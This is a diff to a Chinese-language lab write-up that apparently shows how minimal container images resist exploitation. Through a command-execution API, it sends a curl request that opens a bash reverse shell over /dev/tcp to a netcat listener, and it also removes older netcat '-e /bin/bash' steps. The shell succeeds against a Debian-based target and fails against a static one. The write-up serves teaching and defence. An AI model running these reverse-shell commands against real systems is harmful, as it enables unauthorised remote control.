@@ -74,67 +74,48 @@ curl -X POST http://127.0.0.1:8081/v0/cmd -d '{
 
 ### 0x03.1 lastest 靶机
 
+1. **攻击机** 执行 `nc` 命令 监听端口， 等待反弹连接。
 ```bash
 nc -nvlp 4444
 ```
 
+2. **攻击机** 执行 POST 命令， 进行恶意请求。
+
 ```bash
 # latest
-## nc -v 192.168.233.3 4444 -e /bin/bash
 curl -X POST http://192.168.233.3:8081/v0/cmd -d '{
     "command":"bash",
-    "args":["--version"]
-}'
-
-curl -X POST http://192.168.233.3:8081/v0/cmd -d '{
-    "command":"apt",
-    "args":["update"]
-}'
-
-curl -X POST http://192.168.233.3:8081/v0/cmd -d '{
-    "command":"apt",
-    "args":["install", "-y", "netcat"]
-}'
-
-curl -X POST http://192.168.233.3:8081/v0/cmd -d '{
-    "command":"nc",
-    "args":["-v", "192.168.233.3", "4444", "-e", "/bin/bash"]
+    "args":["-c","bash -i >& /dev/tcp/192.168.233.3/4444 0>&1"]
 }'
 ```
+
+3. **攻击机** `nc` 所监听端口被成功访问， 进入容器 bash 界面。 如图所示
+
+![shell-reflect2-success.png](/images/post/2020/12/03/shell-reflect2-success-with-debian.png)
 
 
 ### 0x03.2 static 靶机
 
-**攻击机** 准备监听端口 `5555`
+1. **攻击机** 准备监听端口 `4444`
 
 ```bash
-nc -nvlp 5555
+nc -nvlp 4444
 ```
 
-**漏洞利用**
+2. **攻击机** 执行 POST 命令， 进行恶意请求。
 
 ```bash
 # static
 curl -X POST http://192.168.233.3:8082/v0/cmd -d '{
     "command":"bash",
-    "args":["--version"]
-}'
-
-curl -X POST http://192.168.233.3:8082/v0/cmd -d '{
-    "command":"apt",
-    "args":["update"]
-}'
-
-curl -X POST http://192.168.233.3:8082/v0/cmd -d '{
-    "command":"apt",
-    "args":["install", "-y", "netcat"]
-}'
-
-curl -X POST http://192.168.233.3:8082/v0/cmd -d '{
-    "command":"nc",
-    "args":["-v", "192.168.233.3", "5555", "-e", "/bin/bash"]
+    "args":["-c","bash -i >& /dev/tcp/192.168.233.3/4444 0>&1"]
 }'
 ```
+
+3. POST 请求报错， 返回信息， `bash` 不存在。 如图所示
+
+![shell-reflect2-failed.png](/images/post/2020/12/03/shell-relect2-failed-with-static.png)
+
 
 ## 0x04 结论
 
